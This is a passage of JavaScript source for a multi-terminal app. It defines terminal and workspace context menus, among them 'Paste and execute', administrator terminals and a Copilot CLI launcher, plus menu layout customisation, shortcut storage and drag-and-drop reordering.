    { label: "Copy", hint: "Ctrl+Shift+C", icon: "clipboard-copy", shortcutId: "terminal.copy", disabled: !hasSelection, run: () => copyTerminalOutput(terminal.id, selection) },
    { label: "Copy and prepare\u2026", icon: "notebook-pen", shortcutId: "terminal.copy-prepare", disabled: !hasSelection, run: () => openPrepareEditor(selection, terminal.id) },
    { label: "Copy all output", icon: "copy", shortcutId: "terminal.copy-all", run: () => { forgetTerminalSelection(terminal); copyTerminalOutput(terminal.id); } },
    { label: "Paste", hint: "Ctrl+Shift+V", icon: "clipboard-paste", shortcutId: "terminal.paste", run: () => pasteIntoTerminal(terminal.id) },
    { label: "Prepare and paste\u2026", icon: "clipboard-pen", shortcutId: "terminal.prepare-paste", run: () => openPrepareAndPaste(terminal) },
    {
      label: "Paste and execute",
      icon: "clipboard-check",
      shortcutId: "terminal.paste-execute",
      title: "Pastes clipboard text and immediately presses Enter",
      run: pasteAndExecute
    },
    { label: "Select all", hint: "Ctrl+A", icon: "text-select", shortcutId: "terminal.select-all", run: () => terminal.term.selectAll() },
    { group: "Find & context", groupId: "find-context" },
    { label: "Find\u2026", hint: "Ctrl+F", icon: "search", shortcutId: "terminal.find", run: () => openFind(terminal) },
    { label: "Find in all terminals\u2026", hint: "Ctrl+Shift+F", icon: "search", shortcutId: "terminal.find-all", run: openFindAll },
    { label: "Clear", hint: "Ctrl+Shift+L", icon: "eraser", shortcutId: "terminal.clear", run: () => clearTerminal(terminal.id) },
    { label: isZoomed ? "Restore size" : "Maximize", hint: "Ctrl+Shift+X", icon: isZoomed ? "minimize-2" : "maximize-2", shortcutId: "terminal.zoom", run: () => toggleZoomPane(terminal.id) },
    { label: "Terminal statistics\u2026", icon: "activity", shortcutId: "terminal.statistics", run: () => openStatistics(terminal.id) },
    { label: "Notes\u2026", icon: "notebook-pen", shortcutId: "terminal.notes", run: () => openTerminalArtifacts(terminal.id) },
    { label: "Send to terminal\u2026", icon: "messages-square", shortcutId: "terminal.send-message", run: () => openTerminalMessages(terminal.id) },
    buildCommandQueueMenuItem(terminal),
    { group: "Tools & automation", groupId: "tools-automation" },
    { label: "Open folder", icon: "folder-open", shortcutId: "terminal.open-folder", run: () => revealTerminalCwd(terminal) },
    { label: "New terminal here", icon: "folder-plus", shortcutId: "terminal.new-here", run: () => addTerminal({ reveal: true, runStartup: true, cwd: terminal.cwd }) },
    {
      label: "Run Copilot CLI (YOLO)",
      icon: "bot",
      shortcutId: "terminal.copilot-yolo",
      title: "Runs Copilot with YOLO permissions in the focused terminal, or opens one on this page",
      run: launchCopilotCli
    },
    {
      label: "Resume Copilot CLI session\u2026",
      icon: "history",
      shortcutId: "terminal.copilot-resume",
      title: "Choose a local Copilot CLI session and resume it with YOLO permissions",
      run: () => openCopilotResume(terminal)
    },
    {
      input: true,
      label: "Copilot model",
      icon: "bot",
      customizationId: "terminal.copilot-model",
      placeholder: "model name",
      run: (value) => sendTerminalSlashCommand(terminal, "model", value)
    },
    {
      input: true,
      label: "Copilot CWD",
      icon: "folder-input",
      customizationId: "terminal.copilot-cwd",
      placeholder: terminal.cwd || "path",
      value: terminal.copilotCwd || terminal.cwd || "",
      suggestions: state.copilotCwdHistory,
      run: (value) => sendCopilotCwd(terminal, value)
    },
    { label: "New Administrator terminal", icon: "shield", shortcutId: "terminal.new-admin", run: () => newAdminTerminal({ shell: terminal.shell, cwd: terminal.cwd }) },
    { label: "Run script\u2026", icon: "file-code", shortcutId: "terminal.run-script", run: () => browseAndRunScript(terminal.id) },
    ...buildLoggingMenuItems(terminal),
    ...(snippetItems.length ? [{ group: "Snippets", groupId: "snippets" }, ...snippetItems] : []),
    { group: "Session", groupId: "session" },
    {
      label: "Split (duplicate)",
      icon: "copy-plus",
      shortcutId: "terminal.duplicate",
      run: () => addTerminal({
        reveal: true,
        runStartup: true,
        title: `${terminal.titleInput.value} copy`,
        copilotCwd: terminal.copilotCwd,
        fontSizeOverride: terminal.fontSizeOverride,
        headerActionOverrides: { ...terminal.headerActionOverrides },
        notificationOverrides: { ...terminal.notificationOverrides }
      })
    },
    { label: "Restart", hint: "Ctrl+Shift+R", icon: "rotate-cw", shortcutId: "terminal.restart", run: () => restartSession(terminal.id) },
    { label: "Cycle color", icon: "tag", shortcutId: "terminal.cycle-color", run: () => cyclePaneColor(terminal) },
    ...buildMoveToPageItems(terminal),
    { label: "Close", hint: "Ctrl+Shift+W", icon: "x", shortcutId: "terminal.close", danger: true, run: () => removeTerminal(terminal.id) }
  ];

  renderContextMenu(items, {
    customizable: true,
    grouped: true,
    searchable: true,
    shortcutEditor: true
  });
}

// The value arrives from a free-text field in the context menu, so it is filtered
// exactly like a queued command: without this a pasted CR would close the slash
// command early and run whatever followed it as a shell command.
function sendTerminalSlashCommand(terminal, command, rawValue) {
  const value = safeTerminalCommand(rawValue);
  if (!terminal || !value) return false;
  return sendBridge({ type: "input", id: terminal.id, data: `/${command} ${value}\r` });
}

function rememberCopilotCwd(value) {
  state.copilotCwdHistory = normalizeCopilotCwdHistory([value, ...state.copilotCwdHistory]);
  localStorage.setItem(COPILOT_CWD_HISTORY_STORAGE_KEY, JSON.stringify(state.copilotCwdHistory));
}

function sendCopilotCwd(terminal, rawValue) {
  const value = safeTerminalCommand(rawValue);
  if (!terminal || !value) return false;
  terminal.copilotCwd = value;
  rememberCopilotCwd(value);
  saveSessionSnapshot();
  return sendTerminalSlashCommand(terminal, "cwd", value);
}

function invokeCopilotCli(terminal) {
  setAwaitingInput(terminal, false);
  if (!sendBridge({ type: "input", id: terminal.id, data: COPILOT_YOLO_COMMAND })) return false;
  sendBridge({ type: "input", id: terminal.id, data: "\r" });
  window.requestAnimationFrame(() => terminal.term.focus());
  return true;
}

function launchCopilotCli() {
  const focused = keyboardFocusedTerminal();
  if (focused) {
    if (focused.status === "live") return invokeCopilotCli(focused);
    focused.pendingCopilotYolo = true;
    toast(`Copilot will start when ${focused.titleInput.value || "the terminal"} is ready`, "info", 2200);
    return true;
  }

  const currentPageId = state.activePageId;
  const terminal = addTerminal({
    reveal: true,
    runStartup: true,
    pageId: currentPageId,
    pendingCopilotYolo: true
  });
  toast(`Opening ${terminal.titleInput.value || "a new terminal"} on ${pageName(currentPageId) || "the current page"}`, "success", 2200);
  return true;
}

// "Here" on the blank surface means the folder you were last working in, which
// tracks `cd` via OSC 7/9, falling back to the workspace CWD field.
function surfaceCwd() {
  const active = state.activeId ? state.terminals.get(state.activeId) : null;
  return (active && active.cwd) || elements.cwdInput.value || "";
}

// Right-clicking the empty area around the panes gets the same menu styling as a
// pane, minus everything that needs a specific terminal. Terminal-specific
// actions that still make sense here (running a script) open a terminal to act
// on instead of being dropped.
function buildSurfaceContextMenu() {
  const here = surfaceCwd();
  const hasTerminals = state.terminals.size > 0;
  const minimized = [...state.terminals.values()].filter((terminal) => terminal.minimized).length;
  const newTerminal = (options) => addTerminal({ reveal: true, runStartup: true, ...options });

  renderContextMenu([
    { label: "New terminal", hint: "Ctrl+T", icon: "plus", run: () => newTerminal({ cwd: here || undefined }) },
    { label: "New terminal here", icon: "folder-plus", title: here || undefined, disabled: !here, run: () => newTerminal({ cwd: here }) },
    { label: "Paste and execute", icon: "clipboard-check", title: "Pastes clipboard text and immediately presses Enter", run: pasteAndExecute },
    { label: "New Administrator terminal", icon: "shield", run: () => newAdminTerminal({ cwd: here || undefined, runStartup: true }) },
    { label: "Run script\u2026", icon: "file-code", run: () => browseAndRunScriptInNewTerminal({ cwd: here }) },
    { label: "Run script as Administrator\u2026", icon: "file-code", run: () => browseAndRunScriptInNewTerminal({ cwd: here, elevated: true }) },
    {
      label: "Run Copilot CLI (YOLO)",
      icon: "bot",
      title: "Runs Copilot with YOLO permissions in the focused terminal, or opens one on this page",
      run: launchCopilotCli
    },
    { separator: true },
    { label: "New PowerShell 7 terminal", icon: "terminal", run: () => newTerminal({ shell: "pwsh", cwd: here || undefined }) },
    { label: "New Windows PowerShell terminal", icon: "terminal", run: () => newTerminal({ shell: "powershell", cwd: here || undefined }) },
    { label: "New Command Prompt terminal", icon: "terminal", run: () => newTerminal({ shell: "cmd", cwd: here || undefined }) },
    { label: "New WSL terminal", icon: "terminal", run: () => newTerminal({ shell: "wsl", cwd: here || undefined }) },
    { separator: true },
    { label: "Find in all terminals\u2026", hint: "Ctrl+Shift+F", icon: "search", disabled: !hasTerminals, run: openFindAll },
    { label: "Broadcast command\u2026", hint: "Ctrl+Shift+B", icon: "megaphone", disabled: !hasTerminals, run: () => toggleBroadcast(true) },
    { label: "All terminal statistics\u2026", icon: "activity", disabled: !hasTerminals, run: () => openStatistics() },
    { label: "Terminal notes & command queue\u2026", icon: "notebook-tabs", run: () => openTerminalArtifacts(state.activeId) },
    { label: "Command palette\u2026", hint: "Ctrl+Shift+P", icon: "command", run: openPalette },
    { separator: true },
    { label: "Open folder", icon: "folder-open", title: here || undefined, disabled: !here, run: () => revealPath(here) },
    ...(minimized
      ? [{ label: `Restore ${minimized} minimized terminal${minimized === 1 ? "" : "s"}`, icon: "maximize-2", run: restoreAllTerminals }]
      : []),
    { label: "Fit all terminals", icon: "maximize", disabled: !hasTerminals, run: fitAllTerminals },
    { label: "Reset layout", icon: "rotate-ccw", run: resetLayout },
    { separator: true },
    { label: "New page", icon: "plus", run: () => addPage() },
    { separator: true },
    { label: "Close all terminals", icon: "trash-2", danger: true, disabled: !hasTerminals, run: closeAllTerminals }
  ]);
}

function buildPaneOverflowMenu(terminal) {
  const compact = elements.host.classList.contains("compact");
  const narrow = terminal.pane.classList.contains("is-narrow");
  const collapsed = compact || narrow;
  const responsiveOverflow = [
    ...(collapsed ? ["move-left", "move-right", "color"] : []),
    ...(narrow ? ["find", "duplicate"] : [])
  ];
  const menuActions = HEADER_ACTION_IDS.filter((action) => headerActionPlacement(terminal, action) === "menu");
  const visibleActions = [...new Set([...responsiveOverflow, ...menuActions])];
  const items = visibleActions
    .map((action) => {
      const definition = HEADER_ACTIONS[action];
      const button = terminal.pane.querySelector(`.pane-actions button[data-action="${action}"]`);
      return {
        ...definition,
        disabled: action === "move-left"
          ? !terminal.pane.previousElementSibling
          : action === "move-right"
            ? !terminal.pane.nextElementSibling
            : Boolean(button?.disabled),
        headerAction: action,
        headerActionTerminalId: terminal.id,
        title: button?.title,
        run: () => runHeaderAction(terminal, action)
      };
    });
  if (narrow) {
    items.unshift({
      label: "Notifications\u2026",
      icon: "bell",
      run: () => openTerminalNotificationFlyout(
        terminal,
        terminal.pane.querySelector('button[data-action="more"]')
      )
    });
  }

  renderContextMenu(items.length > 0 ? items : [{
    info: true,
    label: "Drag a header button here",
    icon: "grip-vertical"
  }]);
}

const CONTEXT_MENU_LAYOUT_STORAGE_KEY = "multiterm.contextMenuLayout";
const CONTEXT_MENU_LAYOUT_VERSION = 1;
const CONTEXT_MENU_MAX_SECTIONS = 32;
const CONTEXT_MENU_MAX_ITEMS = 512;
const CONTEXT_MENU_ID_PATTERN = /^[a-z0-9][a-z0-9:._-]{0,159}$/;
const CONTEXT_MENU_SECTION_ID_PATTERN = /^[a-z0-9][a-z0-9:._-]{0,79}$/;
const CONTEXT_SHORTCUT_STORAGE_KEY = "multiterm.contextMenuShortcuts";
const CONTEXT_SHORTCUT_ID_PATTERN = CONTEXT_MENU_ID_PATTERN;
const CONTEXT_SHORTCUT_MODIFIER_KEYS = new Set(["alt", "altgraph", "control", "meta", "shift"]);

function normalizeContextMenuSectionName(value) {
  return String(value || "")
    .replace(/[\u0000-\u001f\u007f]/g, " ")
    .replace(/\s+/g, " ")
    .trim()
    .slice(0, 48);
}

function normalizeContextMenuLayout(value) {
  const empty = {
    version: CONTEXT_MENU_LAYOUT_VERSION,
    sections: [],
    hidden: [],
    removedSections: []
  };
  if (!value || typeof value !== "object" || Array.isArray(value)) return empty;
  if (value.version != null && Number(value.version) !== CONTEXT_MENU_LAYOUT_VERSION) return empty;

  const sections = [];
  const sectionIds = new Set();
  const placedItemIds = new Set();
  const sourceSections = Array.isArray(value.sections) ? value.sections : [];
  for (const source of sourceSections.slice(0, CONTEXT_MENU_MAX_SECTIONS)) {
    if (!source || typeof source !== "object" || Array.isArray(source)) continue;
    const id = String(source.id || "");
    if (!CONTEXT_MENU_SECTION_ID_PATTERN.test(id) || sectionIds.has(id)) continue;
    sectionIds.add(id);
    const items = [];
    const sourceItems = Array.isArray(source.items) ? source.items : [];
    for (const rawItemId of sourceItems) {
      const itemId = String(rawItemId || "");
      if (!CONTEXT_MENU_ID_PATTERN.test(itemId) || placedItemIds.has(itemId)) continue;
      placedItemIds.add(itemId);
      items.push(itemId);
      if (placedItemIds.size >= CONTEXT_MENU_MAX_ITEMS) break;
    }
    sections.push({
      id,
      name: normalizeContextMenuSectionName(source.name),
      custom: Boolean(source.custom) || id.startsWith("custom:"),
      items
    });
    if (placedItemIds.size >= CONTEXT_MENU_MAX_ITEMS) break;
  }

  const hidden = [];
  const hiddenIds = new Set();
  const sourceHidden = Array.isArray(value.hidden) ? value.hidden : [];
  for (const rawItemId of sourceHidden.slice(0, CONTEXT_MENU_MAX_ITEMS)) {
    const itemId = String(rawItemId || "");
    if (!CONTEXT_MENU_ID_PATTERN.test(itemId) || hiddenIds.has(itemId)) continue;
    hiddenIds.add(itemId);
    hidden.push(itemId);
  }
  const removedSections = [];
  const removedSectionIds = new Set();
  const sourceRemovedSections = Array.isArray(value.removedSections) ? value.removedSections : [];
  for (const rawSectionId of sourceRemovedSections.slice(0, CONTEXT_MENU_MAX_SECTIONS)) {
    const sectionId = String(rawSectionId || "");
    if (!CONTEXT_MENU_SECTION_ID_PATTERN.test(sectionId) || removedSectionIds.has(sectionId)) continue;
    removedSectionIds.add(sectionId);
    removedSections.push(sectionId);
  }
  return { version: CONTEXT_MENU_LAYOUT_VERSION, sections, hidden, removedSections };
}

function loadContextMenuLayout() {
  try {
    const stored = localStorage.getItem(CONTEXT_MENU_LAYOUT_STORAGE_KEY);
    if (!stored || stored.length > 64 * 1024) return normalizeContextMenuLayout(null);
    return normalizeContextMenuLayout(JSON.parse(stored));
  } catch {
    return normalizeContextMenuLayout(null);
  }
}

function saveContextMenuLayout(layout) {
  contextMenuLayout = normalizeContextMenuLayout(layout);
  try {
    localStorage.setItem(CONTEXT_MENU_LAYOUT_STORAGE_KEY, JSON.stringify(contextMenuLayout));
  } catch (error) {
    log.warn("context-menu", "Could not persist context-menu layout", { error: String(error) });
  }
  return contextMenuLayout;
}

function contextMenuItemCustomizationId(item, sectionId, index) {
  const explicit = String(item.customizationId || item.shortcutId || "");
  if (CONTEXT_MENU_ID_PATTERN.test(explicit)) return explicit;
  return `generated:${stableContextActionToken(`${sectionId}\n${item.label || ""}\n${item.icon || ""}\n${index}`)}`;
}

function buildCustomizableContextMenu(items) {
  const defaultSections = [];
  const defaultSectionById = new Map();
  const itemById = new Map();
  let currentSection = null;

  for (let index = 0; index < items.length; index += 1) {
    const item = items[index];
    if (item.group) {
      let id = String(item.groupId || "");
      if (!CONTEXT_MENU_SECTION_ID_PATTERN.test(id)) {
        id = `default:${stableContextActionToken(item.group)}`;
      }
      currentSection = defaultSectionById.get(id);
      if (!currentSection) {
        currentSection = {
          id,
          name: normalizeContextMenuSectionName(item.group) || "Section",
          custom: false,
          items: []
        };
        defaultSections.push(currentSection);
        defaultSectionById.set(id, currentSection);
      }
      continue;
    }
    if (item.separator) continue;
    if (!currentSection) {
      currentSection = { id: "other", name: "Other", custom: false, items: [] };
      defaultSections.push(currentSection);
      defaultSectionById.set(currentSection.id, currentSection);
    }

    let itemId = contextMenuItemCustomizationId(item, currentSection.id, index);
    if (itemById.has(itemId)) {
      itemId = `generated:${stableContextActionToken(`${itemId}\n${index}`)}`;
    }
    currentSection.items.push(itemId);
    itemById.set(itemId, { ...item, customizationId: itemId });
  }

  const saved = normalizeContextMenuLayout(contextMenuLayout);
  const removedSections = new Set(saved.removedSections);
  const sections = saved.sections
    .filter((section) => !removedSections.has(section.id))
    .map((section) => ({
      ...section,
      items: [...section.items]
    }));
  const sectionById = new Map(sections.map((section) => [section.id, section]));
  for (const defaultSection of defaultSections) {
    if (removedSections.has(defaultSection.id)) continue;
    const existing = sectionById.get(defaultSection.id);
    if (existing) {
      if (!existing.name) existing.name = defaultSection.name;
      continue;
    }
    const section = { ...defaultSection, items: [] };
    sections.push(section);
    sectionById.set(section.id, section);
  }
  if (sections.length === 0 && defaultSections.length > 0) {
    const fallback = { ...defaultSections[0], items: [] };
    sections.push(fallback);
    sectionById.set(fallback.id, fallback);
    removedSections.delete(fallback.id);
  }

  const placedItemIds = new Set(sections.flatMap((section) => section.items));
  for (const defaultSection of defaultSections) {
    const target = sectionById.get(defaultSection.id) || sections[0];
    for (let itemIndex = 0; itemIndex < defaultSection.items.length; itemIndex += 1) {
      const itemId = defaultSection.items[itemIndex];
      if (placedItemIds.has(itemId)) continue;
      let insertionIndex = -1;
      for (let siblingIndex = itemIndex - 1; siblingIndex >= 0; siblingIndex -= 1) {
        const placedIndex = target.items.indexOf(defaultSection.items[siblingIndex]);
        if (placedIndex < 0) continue;
        insertionIndex = placedIndex + 1;
        break;
      }
      if (insertionIndex < 0) {
        for (let siblingIndex = itemIndex + 1; siblingIndex < defaultSection.items.length; siblingIndex += 1) {
          const placedIndex = target.items.indexOf(defaultSection.items[siblingIndex]);
          if (placedIndex < 0) continue;
          insertionIndex = placedIndex;
          break;
        }
      }
      target.items.splice(insertionIndex < 0 ? target.items.length : insertionIndex, 0, itemId);
      placedItemIds.add(itemId);
    }
  }

  const hidden = new Set(saved.hidden);
  let hiddenCurrentCount = 0;
  const renderedItems = [];
  for (const section of sections) {
    renderedItems.push({
      group: section.name || "Section",
      groupId: section.id,
      customSection: section.custom
    });
    for (const itemId of section.items) {
      const item = itemById.get(itemId);
      if (!item) continue;
      const customizationHidden = hidden.has(itemId);
      if (customizationHidden) hiddenCurrentCount += 1;
      if (customizationHidden && !ctxShowHiddenItems) continue;
      renderedItems.push({
        ...item,
        customizationHidden,
        customizationSectionId: section.id
      });
    }
  }

  return {
    items: renderedItems,
    model: {
      version: CONTEXT_MENU_LAYOUT_VERSION,
      sections,
      hidden,
      hiddenCurrentCount,
      removedSections
    }
  };
}

let contextMenuLayout = loadContextMenuLayout();

function normalizeContextShortcutKey(value) {
  const rawKey = String(value || "");
  const key = rawKey === " " ? "space" : rawKey.trim().toLowerCase();
  if (!key || key.length > 32 || CONTEXT_SHORTCUT_MODIFIER_KEYS.has(key)) return null;
  return key;
}

function normalizeContextShortcutBinding(value) {
  if (!value || typeof value !== "object" || Array.isArray(value)) return null;
  const key = normalizeContextShortcutKey(value.key);
  if (!key) return null;
  const binding = {
    alt: Boolean(value.alt),
    ctrl: Boolean(value.ctrl),
    key,
    meta: Boolean(value.meta),
    shift: Boolean(value.shift)
  };
  const modified = binding.alt || binding.ctrl || binding.meta || binding.shift;
  return modified || /^[1-9]$/.test(key) ? binding : null;
}

function contextShortcutFromEvent(event) {
  if (!event || event.isComposing) return null;
  const key = normalizeContextShortcutKey(event.key);
  if (!key) return null;
  return normalizeContextShortcutBinding({
    alt: event.altKey,
    ctrl: event.ctrlKey,
    key,
    meta: event.metaKey,
    shift: event.shiftKey
  });
}

function contextShortcutSignature(binding) {
  const normalized = normalizeContextShortcutBinding(binding);
  if (!normalized) return "";
  return [normalized.ctrl ? "ctrl" : "", normalized.alt ? "alt" : "", normalized.shift ? "shift" : "", normalized.meta ? "meta" : "", normalized.key]
    .filter(Boolean)
    .join("+");
}

function contextShortcutKeyLabel(key) {
  const labels = {
    arrowdown: "Down",
    arrowleft: "Left",
    arrowright: "Right",
    arrowup: "Up",
    backspace: "Backspace",
    delete: "Delete",
    end: "End",
    enter: "Enter",
    escape: "Esc",
    home: "Home",
    pagedown: "Page Down",
    pageup: "Page Up",
    space: "Space",
    tab: "Tab"
  };
  return labels[key] || (key.length === 1 ? key.toUpperCase() : key.replace(/^./, (character) => character.toUpperCase()));
}

function formatContextShortcut(binding) {
  const normalized = normalizeContextShortcutBinding(binding);
  if (!normalized) return "";
  return [normalized.ctrl ? "Ctrl" : "", normalized.alt ? "Alt" : "", normalized.shift ? "Shift" : "", normalized.meta ? "Meta" : "", contextShortcutKeyLabel(normalized.key)]
    .filter(Boolean)
    .join("+");
}

function loadContextMenuShortcuts() {
  try {
    const stored = localStorage.getItem(CONTEXT_SHORTCUT_STORAGE_KEY);
    if (!stored || stored.length > 32 * 1024) return new Map();
    const parsed = JSON.parse(stored);
    if (!parsed || typeof parsed !== "object" || Array.isArray(parsed)) return new Map();
    const shortcuts = new Map();
    const signatures = new Set();
    for (const [actionId, value] of Object.entries(parsed).slice(0, 128)) {
      if (!CONTEXT_SHORTCUT_ID_PATTERN.test(actionId)) continue;
      const binding = normalizeContextShortcutBinding(value);
      const signature = contextShortcutSignature(binding);
      if (!binding || !signature || signatures.has(signature)) continue;
      signatures.add(signature);
      shortcuts.set(actionId, binding);
    }
    return shortcuts;
  } catch {
    return new Map();
  }
}

function saveContextMenuShortcuts() {
  try {
    localStorage.setItem(CONTEXT_SHORTCUT_STORAGE_KEY, JSON.stringify(Object.fromEntries(contextMenuShortcuts)));
  } catch (error) {
    log.warn("context-menu", "Could not persist context-menu shortcuts", { error: String(error) });
  }
}

function assignContextMenuShortcut(actionId, binding) {
  const normalized = normalizeContextShortcutBinding(binding);
  const signature = contextShortcutSignature(normalized);
  if (!CONTEXT_SHORTCUT_ID_PATTERN.test(actionId) || !normalized || !signature) return null;
  let displacedActionId = null;
  for (const [otherActionId, otherBinding] of contextMenuShortcuts) {
    if (otherActionId === actionId || contextShortcutSignature(otherBinding) !== signature) continue;
    contextMenuShortcuts.delete(otherActionId);
    displacedActionId = otherActionId;
    break;
  }
  contextMenuShortcuts.set(actionId, normalized);
  saveContextMenuShortcuts();
  return displacedActionId;
}

function clearContextMenuShortcut(actionId) {
  const removed = contextMenuShortcuts.delete(actionId);
  if (removed) saveContextMenuShortcuts();
  return removed;
}

let contextMenuShortcuts = loadContextMenuShortcuts();

// Keyboard activation state for the open menu. Compact menus retain automatic
// letter/number accelerators; the full terminal menu can additionally expose
// persistent, user-assigned digit or modifier shortcuts.
let ctxFocusables = [];
let ctxAllFocusables = [];
let ctxKeyIndex = -1;
let ctxReturnFocus = null;
const ctxByLetter = new Map();
const ctxByNumber = new Map();
const ctxByShortcut = new Map();
let ctxRenderedItems = [];
let ctxRenderOptions = {};
let ctxShortcutCapture = null;
let ctxShortcutEditing = false;
let ctxShortcutStatus = "";
let ctxSearchFocusRequest = 0;
let ctxCustomizationModel = null;
let ctxCustomizationDrag = null;
let ctxSectionDrag = null;
let ctxEditingSectionId = null;
let ctxNewSectionId = null;
let ctxShowHiddenItems = false;
let ctxSuppressCustomizationClick = false;

// A submenu-parent row (currently just "Command queue") hangs a second panel off
// its right edge on hover. These track that panel's rows, keyboard highlight and
// the parent it belongs to, plus a short close timer so sliding the pointer from
// the row into the panel does not dismiss it.
const ctxSubmenus = new Map();
let subFocusables = [];
let subKeyIndex = -1;
let activeSubmenuParent = null;
let submenuCloseTimer = 0;

function runContextMenuAction(run, ...args) {
  const returnFocus = ctxReturnFocus;
  hideContextMenu();
  if (returnFocus?.isConnected) returnFocus.focus({ preventScroll: true });
  run(...args);
}

function contextShortcutActionLabel(actionId) {
  return ctxRenderedItems.find((item) => item.shortcutId === actionId)?.label || "another action";
}

function clampOpenContextMenu() {
  const menu = elements.contextMenu;
  if (menu.hidden) return;
  const rect = menu.getBoundingClientRect();
  const currentLeft = Number.parseFloat(menu.style.left) || 8;
  const currentTop = Number.parseFloat(menu.style.top) || 8;
  menu.style.left = `${Math.max(8, Math.min(currentLeft, window.innerWidth - rect.width - 8))}px`;
  menu.style.top = `${Math.max(8, Math.min(currentTop, window.innerHeight - rect.height - 8))}px`;
}

function rerenderOpenContextMenu({ focusSearch = true } = {}) {
  const items = ctxRenderedItems;
  const options = ctxRenderOptions;
  const searchValue = elements.contextMenu.querySelector(".ctx-menu-search-input")?.value || "";
  renderContextMenu(items, options);
  refreshIcons(elements.contextMenu);
  clampOpenContextMenu();
  const searchInput = elements.contextMenu.querySelector(".ctx-menu-search-input");
  if (searchInput && searchValue) {
    searchInput.value = searchValue;
    filterContextMenu(searchValue);
  }
  const sectionEditor = ctxEditingSectionId
    ? elements.contextMenu.querySelector(`.ctx-group[data-section-id="${CSS.escape(ctxEditingSectionId)}"] .ctx-group-title-input`)
    : null;
  const focusTarget = sectionEditor || (focusSearch ? searchInput : elements.contextMenu);
  focusTarget?.focus({ preventScroll: true });
  if (sectionEditor) sectionEditor.select();
}

function persistContextMenuCustomizationModel() {
  if (!ctxCustomizationModel) return;
  const removedSections = ctxCustomizationModel.removedSections || new Set();
  saveContextMenuLayout({
    version: CONTEXT_MENU_LAYOUT_VERSION,
    sections: ctxCustomizationModel.sections,
    hidden: [...ctxCustomizationModel.hidden],
    removedSections: [...removedSections]
  });
}

function contextMenuSection(sectionId) {
  return ctxCustomizationModel?.sections.find((section) => section.id === sectionId) || null;
}

function clearContextCustomizationDropIndicators() {
  for (const element of elements.contextMenu.querySelectorAll(
    ".is-item-drop-target, .is-item-drop-before, .is-item-drop-after, .is-section-drop-before, .is-section-drop-after"
  )) {
    element.classList.remove(
      "is-item-drop-target",
      "is-item-drop-before",
      "is-item-drop-after",
      "is-section-drop-before",
      "is-section-drop-after"
    );
  }
}

function finishContextCustomizationDrag() {
  clearContextCustomizationDropIndicators();
  elements.contextMenu.querySelector(".ctx-item.is-context-item-dragging")
    ?.classList.remove("is-context-item-dragging");
  ctxCustomizationDrag = null;
  window.setTimeout(() => { ctxSuppressCustomizationClick = false; }, 0);
}

function startContextCustomizationDrag(event, item, element) {
  if (!item.customizationId || !item.customizationSectionId || !ctxCustomizationModel) return;
  hideContextSubmenu();
  ctxCustomizationDrag = {
    itemId: item.customizationId,
    sectionId: item.customizationSectionId
  };
  ctxSuppressCustomizationClick = true;
  element.classList.add("is-context-item-dragging");
  if (event.dataTransfer) {
    event.dataTransfer.effectAllowed = "move";
    event.dataTransfer.setData("application/x-multiterm-context-item", item.customizationId);
    event.dataTransfer.setData("text/plain", item.label || item.customizationId);
  }
}

function finishContextSectionDrag() {
  clearContextCustomizationDropIndicators();
  elements.contextMenu.querySelector(".ctx-group.is-context-section-dragging")
    ?.classList.remove("is-context-section-dragging");
  ctxSectionDrag = null;
}

function startContextSectionDrag(event, sectionId, element) {
  const section = contextMenuSection(sectionId);
  if (!section) return;
  hideContextSubmenu();
  ctxSectionDrag = { sectionId };
  element.classList.add("is-context-section-dragging");
  if (event.dataTransfer) {
    event.dataTransfer.effectAllowed = "move";
    event.dataTransfer.setData("application/x-multiterm-context-section", sectionId);
    event.dataTransfer.setData("text/plain", section.name);
  }
}

function moveContextMenuItem(itemId, targetSectionId, referenceItemId, placeAfter) {
  if (!ctxCustomizationModel || itemId === referenceItemId) return false;
  const target = contextMenuSection(targetSectionId);
  if (!target) return false;

  let found = false;
  for (const section of ctxCustomizationModel.sections) {
    const index = section.items.indexOf(itemId);
    if (index < 0) continue;
    section.items.splice(index, 1);
    found = true;
    break;
  }
  if (!found) return false;

  let insertionIndex = target.items.length;
  if (referenceItemId) {
    const referenceIndex = target.items.indexOf(referenceItemId);
    if (referenceIndex >= 0) insertionIndex = referenceIndex + (placeAfter ? 1 : 0);
  }
  target.items.splice(insertionIndex, 0, itemId);
  persistContextMenuCustomizationModel();
  return true;
}

function moveContextMenuSection(sectionId, referenceSectionId, placeAfter) {
  if (!ctxCustomizationModel || sectionId === referenceSectionId) return false;
  const sections = ctxCustomizationModel.sections;
  const sourceIndex = sections.findIndex((section) => section.id === sectionId);
  if (sourceIndex < 0) return false;
  if (!contextMenuSection(referenceSectionId)) return false;
  const before = sections.map((section) => section.id).join("\n");
  const [section] = sections.splice(sourceIndex, 1);
  const referenceIndex = sections.findIndex((entry) => entry.id === referenceSectionId);
  sections.splice(referenceIndex + (placeAfter ? 1 : 0), 0, section);
  if (sections.map((entry) => entry.id).join("\n") === before) return false;
  persistContextMenuCustomizationModel();
  return true;
}

function bindContextMenuSectionReorderTarget(group, sectionId) {
  const updateIndicator = (event) => {
    if (!ctxSectionDrag || ctxSectionDrag.sectionId === sectionId) return null;
    event.preventDefault();
    if (event.dataTransfer) event.dataTransfer.dropEffect = "move";
    clearContextCustomizationDropIndicators();
    const rect = group.getBoundingClientRect();
    const placeAfter = event.clientY >= rect.top + (rect.height / 2);
    group.classList.add(placeAfter ? "is-section-drop-after" : "is-section-drop-before");
    return placeAfter;
  };

  group.addEventListener("dragover", updateIndicator);
  group.addEventListener("dragleave", (event) => {
    if (!ctxSectionDrag) return;
    if (event.relatedTarget instanceof Node && group.contains(event.relatedTarget)) return;
    clearContextCustomizationDropIndicators();
  });
  group.addEventListener("drop", (event) => {
    if (!ctxSectionDrag) return;
    const placeAfter = updateIndicator(event);
    if (placeAfter == null) return;
    event.preventDefault();
    event.stopPropagation();
    const moved = moveContextMenuSection(ctxSectionDrag.sectionId, sectionId, placeAfter);
    finishContextSectionDrag();
    if (moved) rerenderOpenContextMenu({ focusSearch: false });
  });
}

function bindContextMenuSectionDropTarget(group, body, sectionId) {
  const updateIndicator = (event) => {
    if (!ctxCustomizationDrag) return null;
    event.preventDefault();
    if (event.dataTransfer) event.dataTransfer.dropEffect = "move";
    clearContextCustomizationDropIndicators();
    body.classList.add("is-item-drop-target");

    const target = event.target instanceof Element
      ? event.target.closest(".ctx-item[data-customization-id]")
      : null;
    if (!target || !body.contains(target) || target.dataset.customizationId === ctxCustomizationDrag.itemId) {
      return { referenceItemId: null, placeAfter: true };
    }
    const placeAfter = event.clientY >= target.getBoundingClientRect().top + (target.getBoundingClientRect().height / 2);
